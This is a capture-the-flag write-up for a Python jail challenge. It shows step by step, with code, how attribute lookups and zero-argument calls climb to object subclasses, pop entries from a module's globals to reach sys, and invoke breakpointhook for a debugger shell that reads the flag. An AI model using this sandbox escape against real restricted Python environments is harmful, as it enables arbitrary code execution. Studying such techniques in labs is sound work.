# Get and Call
## Challenge Code
The challenge provides the following Python code:
```python
obj = 0

while True:
    print(f'obj: {obj}')
    print('1. get attribute')
    print('2. call method')
    inp = input("choose > ")
    if inp == '1':
        obj = getattr(obj, input('attr > '), obj)
    if inp == '2':
        obj = obj()
```
## Objective
We control the input and aim to read the contents of `flag.txt` on the server. The initial state of `obj` is `0`. The challenge loops indefinitely, offering two actions:

1. Look up an attribute from `obj` (and replace `obj` with that value).
2. Call/execute the current `obj` (and replace `obj` with that value).
## Observations
An important observation is that we cannot pass arguments to any function or class; everything we call must accept zero arguments. Consequently, calling `print(open('flag.txt').read())` is not feasible. We need to think of no-args functions to read files. `help()` and `breakpoint()` are potential candidates, as they drop us into an interactive environment and may allow access to files or other commands.
## Initial Exploration
In a local testing environment, we use `dir()` to inspect all attributes of the current object. This reveals hidden attributes and methods, such as `__class__`, which shows the datatype of `obj` (e.g., `<class 'int'>`). We can use `getattr` to manipulate the `obj` variable, thus:

1. Send `'1'` and `'__class__'` to set `obj` to `<class 'int'>`.
2. Repeat the process to get `obj` to `<class 'type'>`.
3. Retrieve `<class 'object'>` using `__base__`.

At this stage, the server has effectively executed:
```python
obj = 0
obj = obj.__class__  # <class 'int'>
obj = obj.__class__  # <class 'type'>
obj = obj.__base__   # <class 'object'>
```

## Retrieving Subclasses
We now retrieve all classes derived from `object` by first accessing the `__subclasses__` attribute and then invoking it:
```python
obj = obj.__subclasses__
obj = obj()  # list of classes
```
To access a specific item, we would typically use an index, but since we can only look up attributes or invoke them, we create an iterator using `__iter__()` and retrieve the next element with `__next__()`.
## Reverse Iteration
To circumvent this, we use `__reversed__()` to iterate in reverse order:
```python
obj = obj.__reversed__
obj = obj()  # reverse iterator object
obj = obj.__next__
obj = obj()  # <class '_distutils_hack.shim'>
```
## Accessing Builtins
We now have `<class '_distutils_hack.shim'>`. While examining this class, we found `__enter__`, which references `__builtins__` and `__globals__`. This is significant because `__builtins__` includes references to `help()` and `breakpoint()`.

The `__builtins__` dictionary has `help` as its last key-value pair. By isolating values and using the reverse iterator trick, we access the `help` function:
```python
obj = obj.__enter__
obj = obj.__builtins__
obj = obj.__reversed__
obj = obj()
obj = obj.__next__
obj = obj()  # help function
obj = obj()  # executes help()
```
## Challenges with Help
Although `help()` typically uses a pager (like `less` or `more`) to display output, which can execute external commands, our challenge environment does not use a pager.
## Pivoting to Globals
I pivoted to `__globals__` within the `distutils` module, which contains keys such as `sys` and `os`. Since these are not the first or last elements, the iterator trick does not directly apply. However, `__globals__` is mutable and supports `popitem()`, which allows us to pop items and eventually make `sys` the last element.

## Handling Popitem
After invoking `popitem()`, `obj` becomes a tuple containing the removed key-value pair. To continue manipulating the `__globals__` dictionary, we need to navigate the class hierarchy again (using `__class__`, `__base__`, and `__subclasses__`) to regain access to `__globals__` after each `popitem()` call:
```python
obj = obj.__enter__
obj = obj.__globals__
obj = obj.popitem
obj = obj()  # returns a tuple: ('remove_shim', <function remove_shim at 0x7fe2594dac20>)
```
## Recovering Sys
After popping enough items, we recover `sys` as the last element:
```python
# <<< many popitem() operations >>>
obj = obj.__globals__
obj = obj.__values__
obj = obj()
obj = obj.__reversed__
obj = obj()
obj = obj.__next__
obj = obj()  # <module 'sys' (built-in)>
```
## Final Exploit
The `sys` module contains the `breakpointhook()` function, equivalent to `breakpoint()`, which we can invoke:
```python
obj = obj.breakpointhook  # <built-in function breakpointhook>
obj = obj()               # executes breakpointhook()
```
This drops us into a debugger where we can execute arbitrary Python code:
```python
obj: <built-in function breakpointhook>
1. get attribute
2. call method
choose > 2
> /app/run(5)<module>()
-> while True:
(Pdb) open('flag.txt').read()
'jail{if_you_find_a_way_to_get_rce_without_breakpoint_or_breakpointhook_then_lmk}\n'
```

## Flag

`jail{if_you_find_a_way_to_get_rce_without_breakpoint_or_breakpointhook_then_lmk}`
